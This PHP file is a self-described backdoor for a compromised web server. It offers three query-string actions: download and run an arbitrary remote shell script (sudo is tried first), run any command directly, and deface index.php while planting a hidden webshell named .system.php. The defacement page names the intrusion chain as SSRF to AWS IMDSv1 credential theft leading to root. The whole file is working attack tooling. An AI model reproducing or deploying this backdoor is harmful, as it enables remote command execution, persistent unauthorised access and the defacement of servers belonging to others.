<?php
// Backdoor for executing deface script
// This file should be uploaded to /var/www/html/www/api/backdoor.php

header('Content-Type: application/json');

if (isset($_GET['action']) && $_GET['action'] === 'deface') {
    // Download and execute defacewebsite.sh
    $script_url = isset($_GET['url']) ? $_GET['url'] : '';

    if (empty($script_url)) {
        echo json_encode(['error' => 'No URL provided']);
        exit;
    }

    // Download script
    $script_content = @file_get_contents($script_url);

    if ($script_content === false) {
        echo json_encode(['error' => 'Failed to download script']);
        exit;
    }

    // Save to /tmp
    $script_path = '/tmp/deface_' . time() . '.sh';
    file_put_contents($script_path, $script_content);
    chmod($script_path, 0755);

    // Execute with sudo (if apache has sudo permissions)
    $output = [];
    $return_var = 0;

    // Try different execution methods
    exec("sudo bash $script_path 2>&1", $output, $return_var);

    if ($return_var !== 0) {
        // If sudo fails, try without sudo
        exec("bash $script_path 2>&1", $output, $return_var);
    }

    echo json_encode([
        'status' => $return_var === 0 ? 'success' : 'partial',
        'output' => implode("\n", $output),
        'script_path' => $script_path,
        'return_code' => $return_var
    ]);

} else if (isset($_GET['action']) && $_GET['action'] === 'cmd') {
    // Execute arbitrary command
    $cmd = isset($_GET['cmd']) ? $_GET['cmd'] : 'id';

    $output = [];
    $return_var = 0;

    exec($cmd . " 2>&1", $output, $return_var);

    echo json_encode([
        'command' => $cmd,
        'output' => implode("\n", $output),
        'return_code' => $return_var
    ]);

} else if (isset($_GET['action']) && $_GET['action'] === 'deface_direct') {
    // Direct defacement without downloading

    // Backup original
    $original = '/var/www/html/www/index.php';
    $backup = '/var/www/html/www/index.php.original';

    if (file_exists($original) && !file_exists($backup)) {
        copy($original, $backup);
    }

    // Create hacked page
    $hacked_content = file_get_contents('http://pastebin.com/raw/defaced_page');

    if ($hacked_content === false) {
        // Use inline content
        $hacked_content = <<<'EOFHTML'
<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <title>SYSTEM COMPROMISED</title>
    <style>
        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; text-align: center; padding-top: 20vh; }
        h1 { font-size: 72px; text-shadow: 0 0 20px #0f0; animation: glow 1.5s ease-in-out infinite alternate; }
        @keyframes glow { from { text-shadow: 0 0 10px #0f0; } to { text-shadow: 0 0 30px #0f0, 0 0 50px #0f0; } }
        .skull { font-size: 120px; animation: pulse 1s infinite; }
        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
    </style>
</head>
<body>
    <div class="skull">☠️</div>
    <h1>SYSTEM COMPROMISED</h1>
    <p>AWS IMDSv1 VULNERABILITY EXPLOITED</p>
    <p>health.php → SSRF → IMDS → Credentials → Root Access</p>
    <p style="margin-top: 50px; color: #666;">Compromised at: <?php echo date('Y-m-d H:i:s'); ?></p>
</body>
</html>
EOFHTML;
    }

    // Write hacked page
    $result = file_put_contents($original, $hacked_content);

    // Create webshell
    $webshell = '/var/www/html/www/.system.php';
    $webshell_content = '<?php if(isset($_GET["cmd"])){echo"<pre>";system($_GET["cmd"]);echo"</pre>";} ?>';
    file_put_contents($webshell, $webshell_content);

    echo json_encode([
        'status' => $result !== false ? 'success' : 'failed',
        'defaced' => $result !== false,
        'webshell_created' => file_exists($webshell),
        'webshell_url' => '/www/.system.php?cmd=whoami',
        'backup_created' => file_exists($backup)
    ]);

} else {
    echo json_encode([
        'status' => 'ok',
        'actions' => ['deface', 'cmd', 'deface_direct'],
        'usage' => [
            'deface' => '?action=deface&url=<script_url>',
            'cmd' => '?action=cmd&cmd=<command>',
            'deface_direct' => '?action=deface_direct'
        ]
    ]);
}
?>
